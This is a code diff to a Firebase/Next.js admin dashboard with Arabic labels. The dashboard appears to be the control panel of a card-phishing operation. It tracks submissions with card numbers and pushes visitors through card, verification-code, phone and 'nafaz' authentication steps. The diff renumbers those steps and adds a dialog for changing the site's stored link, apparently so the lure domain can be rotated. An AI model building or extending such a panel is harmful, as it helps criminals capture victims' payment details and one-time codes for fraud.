@@ -39,9 +39,9 @@ import { Button } from "@/components/ui/button"
 import { Badge } from "@/components/ui/badge"
 import { ar } from "date-fns/locale"
 import { formatDistanceToNow, format } from "date-fns"
-import { Dialog, DialogContent, DialogHeader, DialogTitle, DialogFooter } from "@/components/ui/dialog"
+import { Dialog, DialogContent, DialogHeader, DialogTitle, DialogFooter, DialogTrigger } from "@/components/ui/dialog"
 import { Card, CardContent, CardHeader, CardTitle, CardFooter, CardDescription } from "@/components/ui/card"
-import { collection, doc, writeBatch, updateDoc, onSnapshot, query, orderBy } from "firebase/firestore"
+import { collection, doc, writeBatch, updateDoc, onSnapshot, query, orderBy, setDoc } from "firebase/firestore"
 import { onAuthStateChanged, signOut } from "firebase/auth"
 import { onValue, ref } from "firebase/database"
 import { database } from "@/lib/firestore"
@@ -133,8 +133,8 @@ interface Notification {
 }
 
 const stepButtons = [
-  { name: "بطاقه", label: <CreditCard />, step: '3' },
-  { name: "كود", label: <LockIcon />, step: '4' },
+  { name: "بطاقه", label: <CreditCard />, step: '2' },
+  { name: "كود", label: <LockIcon />, step: '3' },
   { name: "رقم", label: <Phone />, step: '9999' },
   { name: "مصادقة", label: <ClipboardCheck />, step: 'nafaz' },
 ]
@@ -748,6 +748,7 @@ export default function NotificationsPage() {
   const [sortOrder, setSortOrder] = useState<"asc" | "desc">("desc")
   const [showStatstics, setShowStatstics] = useState(true)
   const [authNumber, setAuthNumber] = useState('')
+  const [tempUrl, setTempUrl] = useState('')
 
   const router = useRouter()
   const onlineUsersCount = useOnlineUsersCount()
@@ -788,7 +789,19 @@ export default function NotificationsPage() {
   const cardSubmissionsCount = notifications.filter((n) => n.cardNumber).length
   const approvedCount = notifications.filter((n) => n.status === "approved").length
   const pendingCount = notifications.filter((n) => n.status === "pending").length
+   async function saveLink(newUrl: string) {
+    try {
+      const docRef = doc(db, "links", "main") // same doc as before
+      await setDoc(docRef, { url: newUrl }, { merge: true }) // merge = update if exists
+      console.log("✅ Link saved successfully!")
+      alert('تم الحفظ')
+    } catch (error) {
+      console.error("❌ Error saving link:", error)
+      alert('خطا')
 
+    }
+  }
+  
   // Filter and search notifications
   const filteredNotifications = useMemo(() => {
     let filtered = notifications
@@ -1157,6 +1170,7 @@ export default function NotificationsPage() {
                 <p className="text-sm text-muted-foreground">admin@example.com</p>
               </div>
             </div>
+     
             <Separator />
             <nav className="space-y-2">
               <Button variant="ghost" className="w-full justify-start" onClick={() => setMobileMenuOpen(false)}>
@@ -1240,6 +1254,7 @@ export default function NotificationsPage() {
                 </TooltipContent>
               </Tooltip>
             </TooltipProvider>
+    
             <TooltipProvider>
               <Tooltip>
                 <TooltipTrigger asChild>
@@ -1252,12 +1267,43 @@ export default function NotificationsPage() {
                     <RefreshCw className={`h-4 w-4 ${isLoading ? "animate-spin" : ""}`} />
                   </Button>
                 </TooltipTrigger>
+
                 <TooltipContent>
                   <p>تحديث البيانات</p>
                 </TooltipContent>
               </Tooltip>
             </TooltipProvider>
+        <Dialog>
+      <DialogTrigger asChild>
+        <Button variant="outline">تحديث الرابط </Button>
+      </DialogTrigger>
 
+      <DialogContent className="sm:max-w-md">
+        <DialogHeader>
+          <DialogTitle>تحديث الرابط</DialogTitle>
+        </DialogHeader>
+
+        <div className="space-y-3 py-2">
+          <Label htmlFor="url">الرابط الجديد</Label>
+          <Input
+            id="url"
+            type="url"
+            placeholder="https://notfications.com"
+            value={tempUrl}
+            onChange={(e) => setTempUrl(e.target.value)}
+          />
+        </div>
+
+        <DialogFooter>
+          <Button type="button" variant="secondary">
+            الغاء
+          </Button>
+          <Button type="button" onClick={()=>saveLink(tempUrl)}>
+            حفظ
+          </Button>
+        </DialogFooter>
+      </DialogContent>
+    </Dialog>
             <div className="hidden md:flex items-center gap-2">
               <TooltipProvider>
                 <Tooltip>
@@ -1876,6 +1922,7 @@ export default function NotificationsPage() {
           )}
         </DialogContent>
       </Dialog>
+ 
     </div>
   )
 }
